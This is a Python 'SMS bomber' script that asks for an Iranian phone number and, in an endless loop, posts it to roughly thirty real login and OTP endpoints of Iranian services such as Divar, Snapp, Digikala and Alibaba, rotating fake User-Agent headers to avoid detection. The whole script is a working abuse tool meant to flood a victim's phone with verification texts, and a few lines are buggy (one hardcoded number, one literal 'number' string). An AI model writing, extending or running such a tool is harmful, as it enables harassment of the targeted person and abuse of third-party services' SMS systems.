import requests
import time
import random

number = input('enter you number (9xxxxxxxxxx) : ')


url_divar = 'https://api.divar.ir/v5/auth/authenticate'
json_divar ={"phone":"0"+number}	

url_express = 'https://snapp.express/api'
json_express = {"cellphone":"0"+number}

url_azki = 'https://www.azki.co/api/vehicleorder/v2/app/auth/check-login-availability'
json_azki = {"PhoneNumber": number}

url_deniz ='https://deniizshop.com/api/v1/users/update_mobile_phone_request'
json_deniz ={"mobile_phone": number}

url_snappfood = 'https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=97fd0891-3f0d-4100-bbb5-aff181e185c8&locale=fa'
json_snappfood ={"cellphone":"0"+number}

url_snapp = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
json_snapp = {"cellphone":"+98" + number}

url_bh = "https://bck.behtarino.com/api/v1/users/jwt_phone_verification"
json_bh ={"phone":"0"+number}

ulr_alibaba ="https://ws.alibaba.ir/api/v3/account/mobile/otp"
json=json_alibaba ={"phoneNumber":number}

url_tps = "https://tap33.me/api/v2/user"
json_tps = {"credential":{"phoneNumber":number,"role":"PASSENGER"}}

url_shey = "https://www.sheypoor.com/api/v10.0.0/auth/send"
json_shey = {"username":"0" + number}

url_clasino = "https://student.classino.com/otp/v1/api/login"
json_clasino = {'mobile':number}

url_thether = "https://abantether.com/users/login/"
json_tether ={"phoneNumber":number}


heads = [
    {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]

while True:
    random_head = random.choice(heads)
    8
    req = requests.post(url=url_azki,json=json_azki,headers=random_head)
    print('1',req)
    req1 = requests.post(url=url_bh,json=json_bh,headers=random_head)
    print('2',req1)
    req2 = requests.post(url=url_deniz,json=json_deniz,headers=random_head)
    print('3',req2)
    req3 = requests.post(url=url_divar,json=json_divar,headers=random_head)
    print('4',req3)
    req4 = requests.post(url=url_express,json=json_express,headers=random_head)
    print('5',req4)
    req5 = requests.post(url=url_snapp,json=json_snapp,headers=random_head)
    print('6',req5)
    req6 = requests.post(url=url_snappfood,json=json_snappfood,headers=random_head)
    print('7',req6)
    req6 = requests.post(url=ulr_alibaba,json=json_alibaba,headers=random_head)
    print(req6)
    req8 = requests.post(url=url_shey,json=json_shey,headers=random_head)
    print(req8)
    req9 = requests.post(url=url_clasino,json=json_clasino,headers=random_head)
    print(req9)
    req10 = requests.post(url=url_tps,json=json_tps,headers=random_head)
    print(req10)
    req11 = requests.post(url=url_thether,json=json_tether,headers=random_head)
    print('7',req11)
    req11 = requests.post(url=url_thether,json=json_tether,headers=random_head)
    print('7',req11)
    req12= requests.post(url="https://api.digikala.com/v1/user/authenticate/",json={"username":"0"+number},headers=random_head)
    print(req12)
    req13= requests.post(url="https://api.flytoday.ir/api/v2/user/CheckLogin",json={"username":"0"+number},headers=random_head)
    print(req13)
    req14 = requests.post(url="https://www.digistyle.com/users/login-register/",json={"loginRegister":"0"+number},headers=random_head)
    print(req14)
    req15 = requests.post(url="https://api.irangard.com/api/Users/Exists",json={"username":"0"+ number},headers=random_head)
    print(req15)
    req16 = requests.post(url="https://api.malltina.com/profiles",json={"mobile":"0"+number},headers=random_head)
    print(req16)
    req17 = requests.post(url="https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",json={"UserName":"+98"+number},headers=random_head)
    print(req17)
    req18 = requests.post(url="https://www.vitrin.shop/api/v1/user/request_code",json={"phone_number":"0"+number},headers=random_head)
    print(req18)
    req19 = requests.post(url="https://api.digikalajet.ir/user/login-register/",json={"phone":"0"+number},headers=random_head)
    print(req19)
    req20 = requests.post(url="https://uiapi2.saapa.ir/api/otp/sendCode",json={"mobile":"0"+number},headers=random_head)
    print(req20)
    req21 = requests.post(url="https://gw.jabama.com/api/v4/account/send-code",json={"mobile":"09335789863"+number},headers=random_head)
    print(req21)
    req22= requests.post(url="https://takshopaccessorise.ir/api/v1/sessions/login_request",json={"mobile_phone":"0"+number},headers=random_head)
    print(req22)
    req23 = requests.post(url="https://bama.ir/signin-checkforcellnumber",json={"cellNumber":"0"+number},headers=random_head)
    print(req23)
    req24 = requests.post(url="https://api.bitbarg.com/api/v1/authentication/registerOrLogin",json={"phone":"0"+"number"},headers=random_head)
    print(req24)
    req25 = requests.post(url="https://api.bahramshop.ir/api/user/validate/username",json={"username":"0"+number})
    print(req25)
    req26= requests.post(url="https://mobapi.banimode.com/api/v2/auth/request",json={"phone":"0"+number})
    print(req26)
    req27 = requests.post(url="https://api.bitpin.ir/v1/usr/sub_phone/",json={"phone":"0"+number})
    print(req27)
    req28 = requests.post(url="	https://api.shab.ir/api/fa/sandbox/v_1_4/auth/check-mobile",json={"mobile":"0"+number})
    print(req28)